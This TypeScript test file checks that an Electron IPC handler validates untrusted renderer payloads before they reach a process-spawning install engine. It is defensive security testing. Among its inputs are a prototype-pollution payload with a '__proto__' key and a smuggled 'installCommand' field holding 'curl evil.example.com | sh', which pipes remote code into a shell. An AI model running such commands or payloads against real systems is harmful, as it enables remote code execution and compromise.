/**
 * @file catalog-convert-install-ipc.test.ts
 * @description ISS-6703 — the trust boundary in front of the FEA-4079 convert
 * engine.
 *
 * `desktop:db:catalog-convert-install` is an `ipcMain.handle` that takes an
 * UNTRUSTED renderer payload and drives a process spawn: anything that gets past
 * `convertInstallRequestSchema` reaches `convertInstall`, which runs the vetted
 * catalog install command through `streamRun`. So the property under test is not
 * "a bad request returns an error" but "a bad request never reaches the engine",
 * and the returned outcome ALONE cannot tell those two apart —
 * `makeConvertInstallErrorOutcome` builds the same `state`/`failureClass` shape
 * whether the schema rejected the payload or the engine failed downstream. Every
 * rejection case below therefore asserts the `convertInstall` spy has ZERO
 * calls. That count, not the returned shape, is what a validate-after-spawn
 * regression fails on.
 *
 * Types do not constrain an IPC payload at runtime, so the malformed inputs
 * exercised here are reachable rather than type-forbidden — the repo's
 * don't-test-type-forbidden-inputs carve-out stops at every trust boundary.
 *
 * SCOPE, stated because the boundary has two gates and this suite pins ONE.
 * Sender trust is enforced a layer up, by the injected `withDb` wrapper, which
 * rejects an untrusted frame before any handler body runs; this module never
 * sees that check and cannot fail it, so the `withDb` double below deliberately
 * does not re-implement it. What is asserted here is the SCHEMA gate inside the
 * handler — the second gate, and the only one this file owns.
 */

import assert from "node:assert/strict";
import { AgentComponentKind } from "@repo/api/src/types/agent-component";
import {
  ConvertFailureClass,
  type ConvertInstallOutcome,
  type ConvertInstallRequest,
  ConvertInstallState,
} from "@repo/api/src/types/convert-install";
import { ConversionSupport } from "@repo/api/src/types/harness-conversion";
import { HarnessName } from "@repo/api/src/types/harness-name";
import type { BrowserWindow, IpcMainInvokeEvent } from "electron";
import { afterEach, beforeEach, describe, test, vi } from "vitest";
import { CATALOG_CONVERT_INSTALL_CHANNEL } from "../src/main/dashboard/agent-dashboard-ipc-contract.js";
import type { WithDb } from "../src/main/dashboard/agent-dashboard-ipc-handler-wrappers.js";
import { RoutedStoreOp } from "../src/main/dashboard/store-op-router.js";
import type { DbHostAgentDatabase } from "../src/main/database/sqlite.js";
import { registerCatalogConvertInstallHandler } from "../src/main/packs/catalog-convert-install-ipc.js";
import { convertInstall } from "../src/main/packs/convert-engine.js";
import type { InstallAction } from "../src/main/packs/install-command-resolver.js";
import { streamRun } from "../src/main/packs/install-orchestrator.js";
import {
  registeredInvokeHandler,
  resetElectronModuleStub,
} from "./helpers/electron-module-stub.js";
import { fakeWindow, type SendCall } from "./helpers/fake-window.js";

vi.mock("electron", async () => {
  const stub = await import("./helpers/electron-module-stub.js");
  return { ...stub, default: stub.default };
});

// The engine and the install orchestrator are spied rather than run: this suite
// is about what the handler lets THROUGH to them, so their call counts and
// arguments are the observable, and running the real ones would spawn a child.
vi.mock("../src/main/packs/convert-engine.js", () => ({
  convertInstall: vi.fn(),
}));

vi.mock("../src/main/packs/install-orchestrator.js", () => ({
  streamRun: vi.fn(),
}));

/**
 * The rescan op is the CANONICAL {@link RoutedStoreOp.PackScannerRun}, imported
 * rather than restated: `routeStoreOp` compares an incoming op name against that
 * same constant to decide whether the main-process coordinator intercepts the
 * scan, so a rename there must break this suite rather than silently leave it
 * asserting a dead string.
 *
 * The renderer channel has no such owner — it is a bare literal at each of its
 * production call sites — so it is restated here, as the sibling
 * `pack-install-rescan-notify.test.ts` restates it.
 */
const PACK_SCANNER_RUN_OP = RoutedStoreOp.PackScannerRun;
const DB_CHANGED_CHANNEL = "desktop:db:changed";

/** Bound to the production union, so a typo here fails `tsc` rather than a run. */
const INSTALL_ACTION: InstallAction = "install";

/** What `streamRun` hands `onComplete` when the install subprocess exits clean. */
const COMPLETED_RUN = { exit_code: 0, killed: false };

/**
 * One valid request, written as an independent literal rather than derived by
 * running `convertInstallRequestSchema` over an input — the duplication IS the
 * test. `parsed.data` must deep-equal exactly this.
 */
const VALID_REQUEST = {
  packId: "code-review",
  name: "Code Review",
  kind: AgentComponentKind.Skill,
  currentHarness: HarnessName.Claude,
  targetHarness: HarnessName.Codex,
  sourceHarness: HarnessName.Claude,
  cwd: "/workspace/project",
} satisfies ConvertInstallRequest;

/**
 * The arguments the ENGINE hands its install runner, deliberately different in
 * every position from {@link VALID_REQUEST}'s. The closure must forward its own
 * parameters, not re-read the request it was built over; identical values would
 * let a swapped or re-read field stay green.
 */
const RUNNER_PACK_ID = "runner-pack-id";
const RUNNER_HARNESS = HarnessName.Opencode;
const RUNNER_CWD = "/runner/cwd";

/**
 * The complete outcome a schema rejection must return, pinned field-by-field
 * rather than by calling `makeConvertInstallErrorOutcome` — the factory is the
 * thing under test here, so building the expectation from it would assert only
 * that it equals itself. `identity`, `capability` and `droppedFields` are
 * asserted by VALUE because the handler's own comment says consumers dereference
 * them: a partial `{ state, failureClass, message }` literal would hand the
 * renderer an `undefined` to walk past on exactly the invalid-input path.
 */
const EXPECTED_REJECTION_OUTCOME = {
  state: ConvertInstallState.Error,
  identity: {
    id: "",
    name: "",
    kind: "",
    sourceHarness: "",
    currentHarness: "",
    targetHarness: "",
  },
  capability: { support: ConversionSupport.Unsupported, droppedFields: [] },
  droppedFields: [],
  failureClass: ConvertFailureClass.Permanent,
  message: "Invalid convert-install request.",
};

/** What the engine resolves with on the happy path, echoed back to the caller. */
const ENGINE_OUTCOME: ConvertInstallOutcome = {
  state: ConvertInstallState.Installed,
  identity: {
    id: VALID_REQUEST.packId,
    name: VALID_REQUEST.name,
    kind: VALID_REQUEST.kind,
    sourceHarness: VALID_REQUEST.sourceHarness,
    currentHarness: VALID_REQUEST.currentHarness,
    targetHarness: VALID_REQUEST.targetHarness,
  },
  capability: { support: ConversionSupport.Supported, droppedFields: [] },
  droppedFields: [],
  runId: 41,
};

/**
 * Reachable malformed payloads. Every one is a shape the renderer can actually
 * send — the IPC boundary has no compile-time guarantee — and every one must
 * stop at the schema.
 */
const MALFORMED_PAYLOADS: readonly (readonly [string, unknown])[] = [
  ["no payload at all", undefined],
  ["a null payload", null],
  ["a non-object payload", "code-review"],
  [
    "a missing required field",
    {
      packId: "code-review",
      kind: AgentComponentKind.Skill,
      currentHarness: HarnessName.Claude,
      targetHarness: HarnessName.Codex,
    },
  ],
  ["a wrong-typed field", { ...VALID_REQUEST, packId: 42 }],
  ["an empty required string", { ...VALID_REQUEST, packId: "" }],
  [
    "an unknown target harness",
    { ...VALID_REQUEST, targetHarness: "definitely-not-a-harness" },
  ],
  [
    "an unknown component kind",
    { ...VALID_REQUEST, kind: "definitely-not-a-kind" },
  ],
  ["a wrong-typed optional field", { ...VALID_REQUEST, cwd: ["/etc"] }],
];

let unhandledRejections: unknown[] = [];

const recordUnhandledRejection = (reason: unknown): void => {
  unhandledRejections.push(reason);
};

beforeEach(() => {
  resetElectronModuleStub();
  vi.mocked(convertInstall).mockReset();
  vi.mocked(streamRun).mockReset();
  vi.mocked(convertInstall).mockResolvedValue(ENGINE_OUTCOME);
  unhandledRejections = [];
  process.on("unhandledRejection", recordUnhandledRejection);
});

afterEach(() => {
  process.off("unhandledRejection", recordUnhandledRejection);
});

describe("ISS-6703 — a malformed convert-install request never reaches the engine", () => {
  for (const [label, payload] of MALFORMED_PAYLOADS) {
    test(`rejects ${label} without invoking the convert engine`, async () => {
      const harness = makeHarness();

      const outcome = await harness.invoke(payload);

      // THE discriminating assertion. The outcome below is byte-identical to the
      // one an engine failure produces, so without this a handler that spawned
      // first and validated afterwards would stay green.
      assert.equal(
        vi.mocked(convertInstall).mock.calls.length,
        0,
        "the convert engine must not be invoked for a request that failed schema validation"
      );
      assert.equal(
        vi.mocked(streamRun).mock.calls.length,
        0,
        "no install subprocess may be launched for a malformed request"
      );
      assert.deepEqual(outcome, EXPECTED_REJECTION_OUTCOME);
    });
  }

  test("strips an own __proto__ key without polluting the prototype", async () => {
    // The one unknown-key shape that does NOT behave like the others. A renderer
    // payload crosses `ipcRenderer.invoke` by structured clone, which copies
    // `__proto__` across as a real own data property — not the object-literal
    // syntax that merely sets a prototype. `JSON.parse` is only how this test
    // builds that same own-property shape. Zod's shape-driven parse is what
    // keeps it out of `parsed.data`; a future refactor that spread `rawRequest`
    // instead would carry it through, and no assertion on the returned outcome
    // could see that.
    const harness = makeHarness();
    const payload: unknown = JSON.parse(
      `{"packId":"${VALID_REQUEST.packId}","name":"${VALID_REQUEST.name}","kind":"${VALID_REQUEST.kind}","currentHarness":"${VALID_REQUEST.currentHarness}","targetHarness":"${VALID_REQUEST.targetHarness}","sourceHarness":"${VALID_REQUEST.sourceHarness}","cwd":"${VALID_REQUEST.cwd}","__proto__":{"polluted":true}}`
    );

    await harness.invoke(payload);

    assert.deepEqual(engineRequest(), VALID_REQUEST);
    assert.equal(
      Object.hasOwn(engineRequest(), "__proto__"),
      false,
      "the attacker-controlled key must not survive into the engine's request"
    );
    assert.equal(
      ({} as { polluted?: unknown }).polluted,
      undefined,
      "no payload may reach Object.prototype through this boundary"
    );
  });

  test("strips an unknown field instead of forwarding it to the engine", async () => {
    // The schema is a non-strict `z.object`, so an extra key is ACCEPTED and
    // stripped rather than rejected — which makes this the case that pins the
    // handler to `parsed.data`. Forwarding `rawRequest` instead would carry an
    // attacker-chosen key into the engine and still return a valid outcome, so
    // no assertion on the outcome can catch it.
    const harness = makeHarness();

    await harness.invoke({
      ...VALID_REQUEST,
      installCommand: "curl evil.example.com | sh",
    });

    assert.deepEqual(engineRequest(), VALID_REQUEST);
  });
});

describe("ISS-6703 — a valid convert-install request drives the vetted install path", () => {
  test("forwards the parsed request and returns the engine outcome", async () => {
    const harness = makeHarness();

    const outcome = await harness.invoke(VALID_REQUEST);

    assert.equal(vi.mocked(convertInstall).mock.calls.length, 1);
    assert.deepEqual(engineRequest(), VALID_REQUEST);
    assert.deepEqual(outcome, ENGINE_OUTCOME);
  });

  test("the install runner streams the pack, harness and cwd it was handed", async () => {
    const harness = makeHarness();
    await harness.invoke(VALID_REQUEST);

    await engineRunner()(RUNNER_PACK_ID, RUNNER_HARNESS, RUNNER_CWD);

    const [database, options] = streamRunCall();
    // Asserting the closure's CONTENTS, not that a function was passed: the
    // three values below are what decides which command gets spawned, and each
    // differs from the request's own field so a re-read or a swap goes red.
    assert.equal(
      database,
      harness.agentDatabase,
      "the run must go through the database the withDb wrapper resolved"
    );
    assert.equal(options.pack_id, RUNNER_PACK_ID);
    assert.equal(options.harness, RUNNER_HARNESS);
    assert.equal(options.cwd, RUNNER_CWD);
    assert.equal(
      options.action,
      INSTALL_ACTION,
      "a convert-install must resolve the pack's INSTALL command, never its uninstall command"
    );
    assert.equal(options.getWindow, harness.getWindow);
  });
});

describe("ISS-6703 — the completed convert-install rescans the pack inventory", () => {
  test("announces the commit once the rescan resolves", async () => {
    const harness = makeHarness();
    await harness.invoke(VALID_REQUEST);
    await engineRunner()(RUNNER_PACK_ID, RUNNER_HARNESS, RUNNER_CWD);

    const [, options] = streamRunCall();
    assert.equal(
      typeof options.onComplete,
      "function",
      "the install run must carry a post-completion rescan hook"
    );
    options.onComplete?.(COMPLETED_RUN);
    await harness.awaitRescanSettled();

    assert.deepEqual(harness.storeOps(), [PACK_SCANNER_RUN_OP]);
    assert.deepEqual(harness.dbChangedSends(), [DB_CHANGED_CHANNEL]);
  });

  test("swallows a rejected rescan without surfacing it", async () => {
    // Both directions, because "nothing surfaced" is otherwise satisfied by a
    // hook that never ran: the rescan must be OBSERVED to have been attempted
    // and to have announced nothing, and the rejection must not escape. In
    // production `onComplete` is called from the child's `close` handler, which
    // has no error path at all — an unswallowed rejection there is an unhandled
    // one.
    const harness = makeHarness({
      rescan: () => Promise.reject(new Error("db-host unavailable")),
    });
    await harness.invoke(VALID_REQUEST);
    await engineRunner()(RUNNER_PACK_ID, RUNNER_HARNESS, RUNNER_CWD);

    const [, options] = streamRunCall();
    assert.equal(
      typeof options.onComplete,
      "function",
      "the install run must carry a post-completion rescan hook"
    );
    options.onComplete?.(COMPLETED_RUN);
    await harness.awaitRescanSettled();

    assert.deepEqual(harness.storeOps(), [PACK_SCANNER_RUN_OP]);
    assert.deepEqual(
      harness.dbChangedSends(),
      [],
      "a failed rescan left the inventory pre-scan, so invalidating the renderer's caches would report an install that did not land"
    );
    assert.deepEqual(unhandledRejections, []);
  });
});

type HarnessOverrides = { rescan?: () => Promise<unknown> };

type Harness = {
  agentDatabase: DbHostAgentDatabase;
  getWindow: () => BrowserWindow | null;
  invoke: (rawRequest: unknown) => Promise<unknown>;
  /** Settle the rescan the case triggered, either way, then flush one turn. */
  awaitRescanSettled: () => Promise<void>;
  storeOps: () => string[];
  dbChangedSends: () => string[];
};

/**
 * The engine's recorded call. These three read back a spy the case has already
 * driven, so a missing call is a broken harness rather than a failed
 * expectation — hence a thrown precondition and not an assertion.
 */
function engineCall() {
  const call = vi.mocked(convertInstall).mock.calls[0];
  if (!call) {
    throw new Error("the convert engine was never invoked");
  }
  return call;
}

/** The engine's first argument: the request the handler let through. */
function engineRequest(): ConvertInstallRequest {
  return engineCall()[0];
}

/** The install-runner closure the handler built for the engine. */
function engineRunner(): (
  packId: string,
  harness: HarnessName,
  cwd?: string
) => Promise<unknown> {
  return engineCall()[1];
}

/** `streamRun`'s arguments on its single recorded call. */
function streamRunCall() {
  const call = vi.mocked(streamRun).mock.calls[0];
  if (!call) {
    throw new Error("streamRun was never invoked");
  }
  return call;
}

/**
 * Register the real handler against a recording `ipcMain`, the shared recording
 * window fixture, and a recording store-op invoker.
 *
 * The `agentDatabase` double cast is the partial-fixture kind test files are
 * exempt from: it is an opaque sentinel, asserted only by identity where the
 * handler forwards it to `streamRun`.
 */
function makeHarness(overrides: HarnessOverrides = {}): Harness {
  const sends: SendCall[] = [];
  const storeOps: string[] = [];
  let markRescanSettled = (): void => undefined;
  const rescanSettled = new Promise<void>((resolve) => {
    markRescanSettled = () => resolve();
  });

  const agentDatabase = {
    sentinel: "agent-database",
  } as unknown as DbHostAgentDatabase;

  const window = fakeWindow({ calls: sends });

  const getWindow = (): BrowserWindow | null => window;

  const invokeStoreOp = (name: string): Promise<unknown> => {
    storeOps.push(name);
    const run = overrides.rescan?.() ?? Promise.resolve({ scanned: 0 });
    return run.then(
      (value) => {
        // Settle a microtask AFTER the production `.then` chain, so the emit (or
        // its provable absence) is already recorded when the awaiting case
        // resumes — rather than sleeping to prove a non-occurrence.
        queueMicrotask(markRescanSettled);
        return value;
      },
      (error: unknown) => {
        queueMicrotask(markRescanSettled);
        throw error;
      }
    );
  };

  const withDb: WithDb =
    <TArgs extends unknown[], TResult>(
      handler: (
        database: DbHostAgentDatabase,
        ...args: TArgs
      ) => TResult | Promise<TResult>
    ) =>
    (_event: IpcMainInvokeEvent, ...args: TArgs) =>
      Promise.resolve(handler(agentDatabase, ...args));

  registerCatalogConvertInstallHandler({ withDb, getWindow, invokeStoreOp });

  const awaitRescanSettled = async (): Promise<void> => {
    await rescanSettled;
    // One macrotask turn, so an unhandled rejection would have been reported by
    // the time the case asserts on it. Not a wait for elapsed time — nothing
    // here is on a clock.
    await new Promise((resolve) => {
      setImmediate(resolve);
    });
  };

  return {
    agentDatabase,
    awaitRescanSettled,
    dbChangedSends: () =>
      sends
        .map((call) => call.channel)
        .filter((channel) => channel === DB_CHANGED_CHANNEL),
    getWindow,
    invoke: (rawRequest: unknown) =>
      Promise.resolve(
        registeredInvokeHandler(CATALOG_CONVERT_INSTALL_CHANNEL)(
          { sender: {} },
          rawRequest
        )
      ),
    storeOps: () => [...storeOps],
  };
}
